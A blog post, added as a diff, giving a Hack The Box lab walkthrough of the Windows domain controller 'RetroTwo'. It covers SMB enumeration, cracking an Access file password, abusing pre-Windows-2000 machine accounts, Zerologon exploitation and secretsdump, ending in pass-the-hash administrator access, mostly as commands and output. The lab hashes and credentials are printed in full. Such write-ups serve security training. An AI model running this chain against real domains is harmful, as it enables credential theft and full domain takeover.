@@ -1,0 +1,487 @@
+---
+layout: post
+title: "[HTB] RetroTwo"
+description: "[Machine] - Easy difficulty"
+background: /img/bg-machine.jpg
+tags: [htb]
+difficulty: Easy
+---
+![](/img/htb_img/RetroTwo_img/img1.png)
+
+- OS: Windows
+- Release Date: 22 Jul 2025
+- Difficulty: Easy
+
+# Enumeration
+## Nmap recon
+```
+❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 20:09 CET
+Nmap scan report for 10.129.5.22
+Host is up (0.042s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5722/tcp  open  msdfsr
+9389/tcp  open  adws
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49167/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
+```
+
+Scripts and versions.
+```
+❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5722,9389,49154,49155,49157,49158,49167 -sCV -Pn -oN targeted $target
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 20:10 CET
+Nmap scan report for 10.129.5.22
+Host is up (0.78s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-05 19:10:59Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+|_ssl-date: 2025-12-05T19:12:27+00:00; +6s from scanner time.
+| ssl-cert: Subject: commonName=BLN01.retro2.vl
+| Not valid before: 2025-12-04T19:06:40
+|_Not valid after:  2026-06-05T19:06:40
+| rdp-ntlm-info: 
+|   Target_Name: RETRO2
+|   NetBIOS_Domain_Name: RETRO2
+|   NetBIOS_Computer_Name: BLN01
+|   DNS_Domain_Name: retro2.vl
+|   DNS_Computer_Name: BLN01.retro2.vl
+|   Product_Version: 6.1.7601
+|_  System_Time: 2025-12-05T19:11:47+00:00
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49167/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-12-05T19:11:51
+|_  start_date: 2025-12-05T19:06:08
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: BLN01
+|   NetBIOS computer name: BLN01\x00
+|   Domain name: retro2.vl
+|   Forest name: retro2.vl
+|   FQDN: BLN01.retro2.vl
+|_  System time: 2025-12-05T20:11:49+01:00
+|_clock-skew: mean: -11m53s, deviation: 26m49s, median: 5s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.29 seconds
+```
+
+We obtained some results from this nmap scan:
+- The domain name is `retro2.vl`
+- The server name is `BLN01.retro2.vl`
+- We can access SMB as a guest user
+- The server's edition is Windows Server 2008
+
+```
+❯ echo "$target retro2.vl BLN01.retro2.vl" | sudo tee -a /etc/hosts
+10.129.5.22 retro2.vl BLN01.retro2.vl
+```
+
+## SMB
+Scanning the SMB share:
+```
+❯ nxc smb retro2.vl -u 'guest' -p '' --shares
+SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.5.22     445    BLN01            [+] retro2.vl\guest: 
+SMB         10.129.5.22     445    BLN01            [*] Enumerated shares
+SMB         10.129.5.22     445    BLN01            Share           Permissions     Remark
+SMB         10.129.5.22     445    BLN01            -----           -----------     ------
+SMB         10.129.5.22     445    BLN01            ADMIN$                          Remote Admin
+SMB         10.129.5.22     445    BLN01            C$                              Default share
+SMB         10.129.5.22     445    BLN01            IPC$                            Remote IPC
+SMB         10.129.5.22     445    BLN01            NETLOGON                        Logon server share 
+SMB         10.129.5.22     445    BLN01            Public          READ            
+SMB         10.129.5.22     445    BLN01            SYSVOL                          Logon server share
+```
+
+We can read the files, let's explore the share `Public` in depth with `smbclient`.
+```
+❯ impacket-smbclient guest@retro2.vl -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# use Public
+# ls
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 .
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 ..
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 DB
+drw-rw-rw-          0  Sat Aug 17 13:58:07 2024 Temp
+# cd DB
+# ls
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 .
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 ..
+-rw-rw-rw-     876544  Sat Aug 17 16:30:34 2024 staff.accdb
+# get staff.accdb
+# cd ..
+# ls
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 .
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 ..
+drw-rw-rw-          0  Sat Aug 17 16:30:37 2024 DB
+drw-rw-rw-          0  Sat Aug 17 13:58:07 2024 Temp
+# cd Temp
+# ls
+drw-rw-rw-          0  Sat Aug 17 13:58:07 2024 .
+drw-rw-rw-          0  Sat Aug 17 13:58:07 2024 ..
+```
+
+We obtained a file, `staff.accdb`.
+We can read this with Microsoft Access. Let's open it.
+
+## Access file
+After opening it with Access we can see that it needs a password, so let's try to crack it.
+
+### Cracking the password
+```
+❯ office2john staff.accdb > hash
+❯ cat hash
+───────┬──────────────────────
+       │ File: hash
+───────┼──────────────────────
+   1   │ staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
+───────┴──────────────────────
+```
+
+Now with `John the Ripper`:
+```
+❯ sudo john -w=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
+Cost 1 (MS Office version) is 2013 for all loaded hashes
+Cost 2 (iteration count) is 100000 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+class08          (staff.accdb)     
+1g 0:00:00:18 DONE (2025-12-05 20:40) 0.05491g/s 253.0p/s 253.0c/s 253.0C/s chuchu..class08
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+The password is `class08`.
+In the Access file we can see some credentials:
+![](/img/htb_img/RetroTwo_img/img2.png)
+
+## Checking the ldapreader account
+```
+❯ nxc ldap BLN01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R'
+LDAP        10.129.5.22     389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.5.22     389    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
+```
+
+Let's run Bloodhound to get the domain information:
+```
+❯ bloodhound-python -u 'ldapreader' -p 'ppYaVcB5R' -d retro2.vl -c All -o bloodhound_results.json -ns $target
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: retro2.vl
+INFO: Getting TGT for user
+<...>
+```
+
+And now let's upload all the data to the GUI.
+
+## Bloodhound exploration
+![](/img/htb_img/RetroTwo_img/img3.png)
+The computers:
+- ADMWS01
+- FS01
+- FS02
+
+All are members of the `Domain Computers` group.
+
+![](/img/htb_img/RetroTwo_img/img4.png)
+The group `Domain Computers` has `GenericWrite` on the three members of the group.
+
+Exploring this computers, we can find the following information:
+
+![](/img/htb_img/RetroTwo_img/img5.png)
+The computer `ADMWS01` has `AddMember` and `AddSelf` rights on the group `Services`.
+This means that `ADMWS01` can add other members to inherit `Services`' rights.
+
+![](/img/htb_img/RetroTwo_img/img6.png)
+The `Services` group is a member of the `Remote Desktop Users` group, which means that its members can RDP into the machines of the domain.
+
+# Foothold
+## PRE-WINDOWS-2000
+The computer `FS01` account is a member of the PRE-WINDOWS 2000 COMPATIBLE ACCESS group. The computers from this group usually get assigned with a password that is like the following:
+- The `SamAccountName` of the account in lowercase minus the dollar sign.
+
+For example, for this machine `FS01`, the credentials should be like this:
+`fs01$/fs01`
+
+Let's try that with netexec:
+```
+❯ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'fs01'
+SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.5.22     445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+```
+
+The flag `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` means that the credentials are valid. We need to change the password first to be able to use it.
+
+```
+❯ bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'fs01$' -p 'fs01' set password fs01$ 'P@ssword123!'
+[+] Password changed successfully!
+```
+
+Let's try now:
+```
+❯ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'P@ssword123!'
+SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.5.22     445    BLN01            [+] retro2.vl\fs01$:P@ssword123!
+```
+
+## ADMWS01$ account
+Now we need to change the password of the next machine, `ADMWS01$`.
+Using the same method:
+```
+❯ bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'fs01$' -p 'P@ssword123!' set password ADMWS01$ 'P@ssword123!'
+[+] Password changed successfully!
+
+❯ nxc smb BLN01.retro2.vl -u 'ADMWS01$' -p 'P@ssword123!'
+SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.5.22     445    BLN01            [+] retro2.vl\ADMWS01$:P@ssword123!
+```
+
+It works, now we can add the `ldapreader` user that we own to the `Services` group.
+```
+❯ bloodyAD --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'P@ssword123!' add groupMember Services ldapreader
+[+] ldapreader added to Services
+```
+
+Now we should be able to access the machine through RDP, using `xfreerdp3` or `remmina`.
+
+## RDP session
+```
+❯ xfreerdp3 /u:'ldapreader' /p:'ppYaVcB5R' /v:$target /d:retro2.vl /tls:seclevel:0
+```
+![](/img/htb_img/RetroTwo_img/img7.png)
+
+### User flag
+We can obtain the user flag from the RDP session:
+![](/img/htb_img/RetroTwo_img/img8.png)
+
+# Privilege Escalation
+I found a CVE for this machine, released by Secura in a paper called `Zerologon`.
+The PoC I found: [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
+
+Let's clone this repo and execute it:
+```
+❯ git clone https://github.com/dirkjanm/CVE-2020-1472.git
+Cloning into 'CVE-2020-1472'...
+remote: Enumerating objects: 41, done.
+remote: Counting objects: 100% (12/12), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 41 (delta 6), reused 4 (delta 4), pack-reused 29 (from 1)
+Receiving objects: 100% (41/41), 23.83 KiB | 11.91 MiB/s, done.
+Resolving deltas: 100% (14/14), done.
+
+❯ cd CVE-2020-1472
+
+❯ uv run --script cve-2020-1472-exploit.py bln01 $target
+Performing authentication attempts...
+===============================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+```
+
+Now we can dump the secrets.
+```
+❯ impacket-secretsdump -just-dc -no-pass 'bln01$@10.129.5.22'
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c06552bdb50ada21a7c74536c231b848:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1e242a90fb9503f383255a4328e75756:::
+admin:1000:aad3b435b51404eeaad3b435b51404ee:49c31c8f60320b9f416bc248231c008c:::
+Julie.Martin:1105:aad3b435b51404eeaad3b435b51404ee:cf4999af837f40d72d1c5bcec27ba9b6:::
+Clare.Smith:1106:aad3b435b51404eeaad3b435b51404ee:a7c82ec08414f0c54637fad20b9aac9e:::
+Laura.Davies:1107:aad3b435b51404eeaad3b435b51404ee:ee74607fad6d8c51b0d488e322f82317:::
+Rhys.Richards:1108:aad3b435b51404eeaad3b435b51404ee:09377f210fdbdcda6f97eda91ddc6879:::
+Leah.Robinson:1109:aad3b435b51404eeaad3b435b51404ee:6333c620221c04d8fb5b6d7ca8b6d6d7:::
+Michelle.Bird:1110:aad3b435b51404eeaad3b435b51404ee:c823220a9bda3ca70ebe7362187c9004:::
+Kayleigh.Stephenson:1111:aad3b435b51404eeaad3b435b51404ee:a78835f0139b3b206f9598fe9c18d707:::
+Charles.Singh:1112:aad3b435b51404eeaad3b435b51404ee:432119e62a10aff8c8200e4f45e772a0:::
+Sam.Humphreys:1113:aad3b435b51404eeaad3b435b51404ee:3c1508fc774de1e6040c68b41a17fdee:::
+Margaret.Austin:1114:aad3b435b51404eeaad3b435b51404ee:c6ebda46b0b014eda3ffcb8d92d179d9:::
+Caroline.James:1115:aad3b435b51404eeaad3b435b51404ee:80835fee4ce88524f63a0ecf60870ac0:::
+Lynda.Giles:1116:aad3b435b51404eeaad3b435b51404ee:dbf17856bd378ec410c20b98a749571f:::
+Emily.Price:1117:aad3b435b51404eeaad3b435b51404ee:9cdf1d59674a6ddfedef2ae2545d3862:::
+Lynne.Dennis:1118:aad3b435b51404eeaad3b435b51404ee:4b690295089b91881633113f13c866ee:::
+Alexandra.Black:1119:aad3b435b51404eeaad3b435b51404ee:3349f04c2fdcf796a66c37b2a7658ae6:::
+Alex.Scott:1120:aad3b435b51404eeaad3b435b51404ee:200155446e3b3817e8bc857dfe01b58c:::
+Mandy.Davies:1121:aad3b435b51404eeaad3b435b51404ee:c144842c62c3051b8f1b8467ec62ef1f:::
+Marilyn.Whitehouse:1122:aad3b435b51404eeaad3b435b51404ee:097b5b5b97e2a3b07db0b3deac5cd303:::
+Lindsey.Harrison:1123:aad3b435b51404eeaad3b435b51404ee:261b8b9c79b19345e8ea15dcdfc03ecd:::
+Sally.Davey:1124:aad3b435b51404eeaad3b435b51404ee:78ac830ac29ae1df8fa569b39515d5a5:::
+retro2.vl\inventory:1128:aad3b435b51404eeaad3b435b51404ee:46b019644dde01251e7044a3d4185bd1:::
+retro2.vl\ldapreader:1130:aad3b435b51404eeaad3b435b51404ee:fe63aaefd1cfd29d7cc5c14321a725f3:::
+BLN01$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+ADMWS01$:1127:aad3b435b51404eeaad3b435b51404ee:c5f2d015f316018f6405522825689ffe:::
+FS01$:1131:aad3b435b51404eeaad3b435b51404ee:c5f2d015f316018f6405522825689ffe:::
+FS02$:1132:aad3b435b51404eeaad3b435b51404ee:eb354224f433cd7cd824b1fdce8c0795:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:1de3d3d429521d8d99e4b4b31da5ce5f993902a8876adaabdd9449a5256c220f
+krbtgt:aes128-cts-hmac-sha1-96:8250eee9083a48b1fca675d7d0ce3699
+krbtgt:des-cbc-md5:d334438313291520
+admin:aes256-cts-hmac-sha1-96:055842e1ada4e1cba5bd0286a4fa9de9337b0324104adc533aabea23ddc353b7
+admin:aes128-cts-hmac-sha1-96:1e0f4d9eb0ea70d225db67d53f297934
+admin:des-cbc-md5:70d0624397c708df
+Julie.Martin:aes256-cts-hmac-sha1-96:5428f080b3303d74da2a344d0b799d97dfb5795fee1d1ed64b3e7e9cc3cbec5c
+Julie.Martin:aes128-cts-hmac-sha1-96:8757cfac9fd8af791bd8f5c9b8bfac0c
+Julie.Martin:des-cbc-md5:0e85dca2e3e6291a
+Clare.Smith:aes256-cts-hmac-sha1-96:65c7c8d4e980f1e63fab4af0fb8b8dc17e9bddff20e7b8bb5fa5c1690561f406
+Clare.Smith:aes128-cts-hmac-sha1-96:54cc3c8caadcd6e9b605d2da4c96e55f
+Clare.Smith:des-cbc-md5:61fe8f52b39ecb9d
+Laura.Davies:aes256-cts-hmac-sha1-96:9ada131aebb330b859770d3177e4b6bf2e37e994d83761e83c296e3dd0549fa4
+Laura.Davies:aes128-cts-hmac-sha1-96:c00363c7acdb7e6efb47e90c46eb73f5
+Laura.Davies:des-cbc-md5:31d670ec9b16c762
+Rhys.Richards:aes256-cts-hmac-sha1-96:805f8d2f3f6c92cbf7bf0fc2449ec03ac8446b0f595aeb68d5e34932bdf1f9a8
+Rhys.Richards:aes128-cts-hmac-sha1-96:baeaf7d174ea76419d381e545935aef2
+Rhys.Richards:des-cbc-md5:6b0e2cf7ae3de3e3
+Leah.Robinson:aes256-cts-hmac-sha1-96:90848db193370cc832b199b27137ef581b78eddc2d5f635a0e01e0b1c514c326
+Leah.Robinson:aes128-cts-hmac-sha1-96:6aa30b143db0f0e65517bb062a4fe6c7
+Leah.Robinson:des-cbc-md5:d9b6abe30e851f9b
+Michelle.Bird:aes256-cts-hmac-sha1-96:a76108bec6385a4469d5eff1d4d5ccaaf066b981d56d3df82f058c1b66b9c653
+Michelle.Bird:aes128-cts-hmac-sha1-96:ca9fdc76c484d05397433e90c2d9b84c
+Michelle.Bird:des-cbc-md5:79b016e69ec4b59b
+Kayleigh.Stephenson:aes256-cts-hmac-sha1-96:6c11e6b4e5e263bbb7b6859b7e4380bf9fce222de2e51da9f033c370d1bd3b34
+Kayleigh.Stephenson:aes128-cts-hmac-sha1-96:69ced3d12c16659ae2fdaa2bab6df2f3
+Kayleigh.Stephenson:des-cbc-md5:ce7ae949452a1997
+Charles.Singh:aes256-cts-hmac-sha1-96:0eb1f6abc867ac77603b9b6f8b454abfef421c6eec2518e28e0e40ee3efb6215
+Charles.Singh:aes128-cts-hmac-sha1-96:3cee7675dd2615a5214127faacb30930
+Charles.Singh:des-cbc-md5:9125dcd6d3ad4fb6
+Sam.Humphreys:aes256-cts-hmac-sha1-96:878ea36ddce6a9e5b050021e757669ff94b8b3367bcb9461dc83cdbcc1342b77
+Sam.Humphreys:aes128-cts-hmac-sha1-96:102e420c74d34cda602282342c555b72
+Sam.Humphreys:des-cbc-md5:5b5bc1a8683816c4
+Margaret.Austin:aes256-cts-hmac-sha1-96:500b6f66a68c384b76ee63fb2d309278638c4eaa2903a7555b7f0a63ed2da30e
+Margaret.Austin:aes128-cts-hmac-sha1-96:2bb2066bea0481bf7c9fae65a908bb64
+Margaret.Austin:des-cbc-md5:077f91679bcb6dda
+Caroline.James:aes256-cts-hmac-sha1-96:0ddabfe9574396df083878375b0e7100c4466698a1d0fa812a07b0bc17f44583
+Caroline.James:aes128-cts-hmac-sha1-96:574766e01691af43749a8c0cc566af0f
+Caroline.James:des-cbc-md5:29574998cd13f813
+Lynda.Giles:aes256-cts-hmac-sha1-96:dc9ca6bdfd27960e9c5700864e0fec0a388f903747d79c61d773cc6e24ea2253
+Lynda.Giles:aes128-cts-hmac-sha1-96:c2eaf2f31cb78d18ac51c1c8b0cd496d
+Lynda.Giles:des-cbc-md5:62b9082f6e1ab92a
+Emily.Price:aes256-cts-hmac-sha1-96:37d0c3e846f44b0c0afe005b178c1e2689ab8cf227c60345e4d83af3bedcd908
+Emily.Price:aes128-cts-hmac-sha1-96:87331a1b619dc0b817a00bd7882973b3
+Emily.Price:des-cbc-md5:d592c7dce0386489
+Lynne.Dennis:aes256-cts-hmac-sha1-96:ec46f167dac2f0763fa4891b4ec7204e8b791b6e757b88f13eaf0a3069d91520
+Lynne.Dennis:aes128-cts-hmac-sha1-96:a6de42302e21936f728c6340cc3924b4
+Lynne.Dennis:des-cbc-md5:2337fe088083d561
+Alexandra.Black:aes256-cts-hmac-sha1-96:63e7bcd8c3827fafac984927c8ee7a410644603b87df03a73d93a5d83d351199
+Alexandra.Black:aes128-cts-hmac-sha1-96:f7f77113ff7a8e070f8d961a973afa80
+Alexandra.Black:des-cbc-md5:70dcdcef4a584c67
+Alex.Scott:aes256-cts-hmac-sha1-96:56e28035bf0e773b08eac63f2ded3b77150f4662335fecfe0d167439954c3c6c
+Alex.Scott:aes128-cts-hmac-sha1-96:1743a9bfda5a6d4937e10833aa94261a
+Alex.Scott:des-cbc-md5:c47a9e6475452f7c
+Mandy.Davies:aes256-cts-hmac-sha1-96:f9ab0b0127d819088c6e20f2a22b62e658e65413634a982e7a03029860b5fbbb
+Mandy.Davies:aes128-cts-hmac-sha1-96:775c402ad1b82a01d00d24cdce2f0cff
+Mandy.Davies:des-cbc-md5:0dcb62cd49a4070b
+Marilyn.Whitehouse:aes256-cts-hmac-sha1-96:070d0ec84b01cee1f4e6f7fde70978e38dd06e9718d29165f7b34687f2bfc57d
+Marilyn.Whitehouse:aes128-cts-hmac-sha1-96:983446f761745cac59cfdf6533be1e62
+Marilyn.Whitehouse:des-cbc-md5:b34fad80d6583d52
+Lindsey.Harrison:aes256-cts-hmac-sha1-96:df8a640121c7931e4b1e24a903831bbdb2ceca342bc32df0d642be5ad59aebaa
+Lindsey.Harrison:aes128-cts-hmac-sha1-96:9c0600e456143cb3a958434295e230c5
+Lindsey.Harrison:des-cbc-md5:df4afde6a83d586d
+Sally.Davey:aes256-cts-hmac-sha1-96:ad994860516e89a93515d9934fbc92ae0e18ac10a4179ce0b5e856d21239c07d
+Sally.Davey:aes128-cts-hmac-sha1-96:1bd25ea0251be749c0b9ff10c0443728
+Sally.Davey:des-cbc-md5:8940a2cde9fb45f1
+retro2.vl\inventory:aes256-cts-hmac-sha1-96:251d2610ccb122fbefecbc0bad2a0f1ecffe39e48734d40fc31f9d6c32d9c3a6
+retro2.vl\inventory:aes128-cts-hmac-sha1-96:6a4787b610d341b0d99758c8dd80a405
+retro2.vl\inventory:des-cbc-md5:ad08041f6b0861a7
+retro2.vl\ldapreader:aes256-cts-hmac-sha1-96:1f38605e159b9f10ba465530aa4ea2d9fd5429b3bf348fa8559b5acc647c0b32
+retro2.vl\ldapreader:aes128-cts-hmac-sha1-96:000256e0522cc3cd2f52c6bfe1698368
+retro2.vl\ldapreader:des-cbc-md5:8908762379fdfdae
+BLN01$:aes256-cts-hmac-sha1-96:ffd22246332c76f0831bbae3acbcf7d9160e780f77ecbf6322ec536b8744a280
+BLN01$:aes128-cts-hmac-sha1-96:00489881457ca7f5ba4dac2e1395fd44
+BLN01$:des-cbc-md5:0886138c15a70157
+ADMWS01$:aes256-cts-hmac-sha1-96:3b49a3ee7c2974c4d421cc5c58896808683aa9a8dac50fbe2dcd53e719c9901f
+ADMWS01$:aes128-cts-hmac-sha1-96:535001612b9d01a7ad7b2852d33f3eb4
+ADMWS01$:des-cbc-md5:894f4558c7808f15
+FS01$:aes256-cts-hmac-sha1-96:3523fbf0fb3b42f7b69ab98089d330392ed76b4adbca92ab498f2a2a965856c0
+FS01$:aes128-cts-hmac-sha1-96:c3f8ed0bdca2d09019dbe8be1e639178
+FS01$:des-cbc-md5:0da8a8737fcd615e
+FS02$:aes256-cts-hmac-sha1-96:fcceafa1335a9e262a1e4532d516011d4e8b80ae7f35fb35714a2a6410db18bc
+FS02$:aes128-cts-hmac-sha1-96:5f2c27f494ab454d875057c909790e3e
+FS02$:des-cbc-md5:252afd385b04b0bf
+[*] Cleaning up...
+```
+
+## Root shell
+```
+❯ /opt/impacket/examples/wmiexec.py -hashes :c06552bdb50ada21a7c74536c231b848 retro2.vl/administrator@bln01.retro2.vl
+Impacket v0.14.0.dev0+20251022.130809.0ceec09d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+retro2\administrator
+
+```
+### Root flag
+```
+Directory of C:\Users\Administrator\Desktop
+
+08/17/2024  03:17 PM    <DIR>          .
+08/17/2024  03:17 PM    <DIR>          ..
+04/11/2025  12:00 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   3,246,026,752 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+<REDACTED>
+```
